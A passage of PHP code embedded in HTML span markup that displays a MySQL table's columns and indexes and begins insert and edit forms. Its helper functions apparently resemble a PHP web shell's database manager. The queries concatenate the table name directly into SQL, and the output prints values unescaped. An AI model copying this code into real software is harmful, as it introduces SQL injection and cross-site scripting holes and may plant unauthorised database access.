#999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   while($row = mysql_fetch_array($result)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $rowdb[] = $row;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;h3&gt;Structure&lt;/h3&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;table border=\"0\" cellpadding=\"3\" cellspacing=\"0\"&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"head\"&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Field&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Type&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Collation&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Null&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Key&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Default&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Extra&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Privileges&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Comment&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/tr&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach ($rowdb as $row) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $thisbg = bg();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\<span style=\"text-decoration: underline;\">'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\"&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$row['Field'].'&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$row['Type'].'&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$row['Collation'].'&amp;nbsp;&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$row['Null'].'&amp;nbsp;&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$row['Key'].'&amp;nbsp;&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$row['Default'].'&amp;nbsp;&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$row['Extra'].'&amp;nbsp;&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$row['Privileges'].'&amp;nbsp;&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$row['Comment'].'&amp;nbsp;&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/tr&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   tbfoot();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $result = q(\"SHOW INDEX FROM $tablename\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $rowdb = array();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   while($row = mysql_fetch_array($result)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $rowdb[] = $row;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;h3&gt;Indexes&lt;/h3&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;table border=\"0\" cellpadding=\"3\" cellspacing=\"0\"&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"head\"&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Keyname&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Type&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Unique&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Packed&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Seq_in_index&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Field&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Cardinality&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Collation&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Null&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Comment&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/tr&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach ($rowdb as $row) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $thisbg = bg();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\<span style=\"text-decoration: underline;\">'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\"&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$row['Key_name'].'&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$row['Index_type'].'&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.($row['Non_unique'] ? 'No' : 'Yes').'&amp;nbsp;&lt;/td<span style=\"text-decoration: underline;\">&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.($row['Packed'] === null ? 'No' : $row['Packed'<span style=\"text-decoration: underline;\">]).'&amp;nbsp;&lt;/td&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$row['Seq_in_index'].'&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$row['Column_name'].($row['Sub_part'] ? '('.$ro<span style=\"text-decoration: underline;\">w['Sub_part'].')' : '').'&amp;nbsp;&lt;/td&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.($row['Cardinality'] ? $row['Cardinality'] : 0)<span style=\"text-decoration: underline;\">.'&amp;nbsp;&lt;/td&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$row['Collation'].'&amp;nbsp;&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$row['Null'].'&amp;nbsp;&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$row['Comment'].'&amp;nbsp;&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/tr&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   tbfoot();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } elseif ($doing == 'insert' || $doing == 'edit') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $result = q('SHOW COLUMNS FROM '.$tablename);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   while ($row = mysql_fetch_array($result)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $rowdb[] = $row;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $rs = array();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($doing == 'insert') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;h2&gt;Insert new line in '.$tablename.' table &amp;raquo;&lt;/<span style=\"text-decoration: underline;\">h2&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;h2&gt;Update record in '.$tablename.' table 